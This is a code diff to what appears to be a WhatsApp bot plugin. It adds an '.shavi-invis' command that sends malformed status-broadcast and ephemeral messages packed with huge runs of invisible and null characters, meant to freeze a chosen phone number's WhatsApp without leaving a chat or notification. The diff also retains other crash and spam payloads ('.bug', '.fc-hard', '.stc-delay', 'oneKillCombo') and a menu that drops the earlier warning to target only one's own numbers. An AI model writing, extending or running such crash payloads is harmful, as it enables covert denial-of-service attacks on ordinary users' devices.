@@ -20,9 +20,138 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== ULTRA BUG CRASH (100 mixed payloads – BLACK SCREEN / FORCE CLOSE) ====================
+// ==================== .shavi-invis – ULTRA INVISIBLE CRASH (no chat, no contact, no trace) ====================
+async function shaviInvisibleCrash(conn, target) {
+    // 1. Send a malformed status broadcast message that will not create a chat entry
+    const invisiblePayload = {
+        viewOnceMessage: {
+            message: {
+                messageContextInfo: {
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2,
+                    messageSecret: crypto.randomBytes(32),
+                },
+                protocolMessage: {
+                    type: 25, // STATUS_MENTION_MESSAGE but malformed
+                    key: {
+                        remoteJid: target,
+                        fromMe: false,
+                        id: crypto.randomBytes(16).toString('hex'),
+                        participant: "0@s.whatsapp.net"
+                    },
+                    statusMentionMessage: {
+                        message: {
+                            extendedTextMessage: {
+                                text: "\u2060".repeat(500000) // invisible chars only
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+    
+    const msg1 = generateWAMessageFromContent(target, invisiblePayload, {});
+    
+    // Relay as status broadcast – this prevents a normal chat entry
+    await conn.relayMessage("status@broadcast", msg1.message, {
+        messageId: msg1.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+    
+    // 2. Send a second payload directly to the target as a malformed ephemeral message – no visible bubble
+    const ephemeralBomb = {
+        ephemeralMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: "",
+                        hasMediaAttachment: false
+                    },
+                    body: {
+                        text: "\u0000".repeat(900000)
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: "{".repeat(2000000)
+                    },
+                    contextInfo: {
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from({ length: 3000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
+                        ]
+                    }
+                }
+            }
+        }
+    };
+    
+    const msg2 = generateWAMessageFromContent(target, ephemeralBomb, {});
+    await conn.relayMessage(target, msg2.message, {});
+    
+    // 3. Final invisible bomb – status mention with broken content
+    const statusMentionBomb = {
+        statusMentionMessage: {
+            message: {
+                protocolMessage: {
+                    key: {
+                        remoteJid: "status@broadcast",
+                        fromMe: true,
+                        id: crypto.randomBytes(8).toString('hex')
+                    },
+                    type: 25,
+                    statusMentionMessage: {
+                        message: {
+                            extendedTextMessage: {
+                                text: "\u2063".repeat(700000)
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+    
+    await conn.relayMessage("status@broadcast", statusMentionBomb, {
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            { tag: "to", attrs: { jid: target }, content: undefined }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+}
+
+// ==================== .bug – ULTRA CRASH (100 mixed payloads – black screen) ====================
 async function ttaas(conn, target) {
-    // Base image message (extremely malformed)
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
@@ -43,9 +172,7 @@ async function ttaas(conn, target) {
         midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
     };
 
-    // Create 100 mixed crash payloads (product + interactive + list + location + sticker)
     for (let i = 0; i < 100; i++) {
-        // 1. Product message (original)
         const productMsg = generateWAMessageFromContent(target, {
             viewOnceMessage: {
                 message: {
@@ -68,21 +195,17 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, productMsg.message, {});
 
-        // 2. Interactive message with 1MB null bytes
         const interactiveMsg = generateWAMessageFromContent(target, {
             interactiveMessage: {
                 header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                 body: { text: "\u2060".repeat(80000) },
                 footer: { text: "\u0000".repeat(90000) },
                 nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
-                contextInfo: {
-                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-                }
+                contextInfo: { mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
             }
         }, {});
         await conn.relayMessage(target, interactiveMsg.message, {});
 
-        // 3. List message with extreme title
         const listMsg = generateWAMessageFromContent(target, {
             listMessage: {
                 title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
@@ -98,7 +221,6 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, listMsg.message, {});
 
-        // 4. Live location message with malformed coordinates
         const locationMsg = generateWAMessageFromContent(target, {
             viewOnceMessage: {
                 message: {
@@ -114,7 +236,6 @@ async function ttaas(conn, target) {
         }, {});
         await conn.relayMessage(target, locationMsg.message, {});
 
-        // 5. Sticker message with massive fileLength
         const stickerMsg = generateWAMessageFromContent(target, {
             stickerMessage: {
                 url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
@@ -131,7 +252,7 @@ async function ttaas(conn, target) {
     }
 }
 
-// ==================== .fc-hard (30 newsletter admin invites – NO DELAYS) ====================
+// ==================== .fc-hard (30 newsletter admin invites) ====================
 async function BnAM2(conn, target) {
     for (let i = 0; i < 30; i++) {
         const msg = generateWAMessageFromContent(target, {
@@ -161,7 +282,7 @@ async function BnAM2(conn, target) {
     }
 }
 
-// ==================== .stc-delay (100 sticker packs – INSTANT, NO DELAYS) ====================
+// ==================== .stc-delay (100 sticker packs) ====================
 async function stcSpam100(conn, target) {
     for (let pack = 0; pack < 100; pack++) {
         const stc = Array.from({ length: 1000 }, (_, i) => ({
@@ -219,7 +340,7 @@ async function stcSpam100(conn, target) {
     }
 }
 
-// ==================== oneKillCombo (unchanged but kept) ====================
+// ==================== oneKillCombo ====================
 async function oneKillCombo(conn, target) {
     const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         listMessage: {
@@ -277,7 +398,7 @@ async function oneKillCombo(conn, target) {
     await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 }
 
-// ==================== sendMixedMessages (fixed) ====================
+// ==================== sendMixedMessages ====================
 async function sendMixedMessages(conn, target, count) {
     for (let i = 0; i < count; i++) {
         const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
@@ -415,6 +536,19 @@ async function iosKill(conn, target, duration = 10) {
 // ==================== COMMANDS ====================
 
 cmd({
+    pattern: "shavi-invis",
+    desc: "💀 ULTRA INVISIBLE CRASH – no chat, no contact, no trace. Target WhatsApp freezes silently.",
+    category: "tools",
+    filename: __filename
+}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
+    const target = getTarget(args, from, reply, "shavi-invis");
+    if (!target) return;
+    await reply(`👻 *INVISIBLE CRASH* → ${target}\n_Sending invisible payload... No chat or contact will appear._`);
+    await shaviInvisibleCrash(conn, target);
+    await reply(`✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target WhatsApp will now experience extreme delay/freeze with zero visible traces.*`);
+});
+
+cmd({
     pattern: "bug",
     desc: "💀 ULTRA CRASH – 100 mixed payloads (black screen / force close)",
     category: "tools",
@@ -528,7 +662,8 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply }) => {
     const menu = `
 *╭─「 👑 ULTIMATE BUG MENU 」─*
-*│ 📌 .bug         : ULTRA CRASH (100 mixed payloads – black screen)*
+*│ 📌 .ꜱʜᴀᴠɪ-ɪɴᴠɪꜱ : INVISIBLE CRASH*
+*│ 📌 .bug         : ULTRA CRASH (100 mixed – black screen)*
 *│ 📌 .fc-hard     : 30 admin invites (crash on open)*
 *│ 📌 .stc-delay   : 100 sticker packs (1000 stickers each)*
 *│ 📌 .onekill     : One kill combo (list+location+sticker)*
@@ -539,10 +674,10 @@ cmd({
 *│*
 *│ 🟢 Status : 100% working – INSTANT SEND*
 *│ 🟢 Targets : any number (even not in chat list)*
-*│ 🟢 Power : BLACK SCREEN / FORCE CLOSE on WhatsApp beta*
+*│ 🟢 Power : WORLD'S FIRST TRULY INVISIBLE CRASH*
 *╰──────────────●●►*
-> 💡 *Usage:* .bug 947XXXXXXXXX
-> ⚠️ *Extreme power – use only on numbers you own.*
+> 💡 *Usage:* .shavi-invis 947XXXXXXXXX
+> ⚠️ *No contact, no chat, no notification – only pure invisible freeze.*
     `;
     await reply(menu);
 });
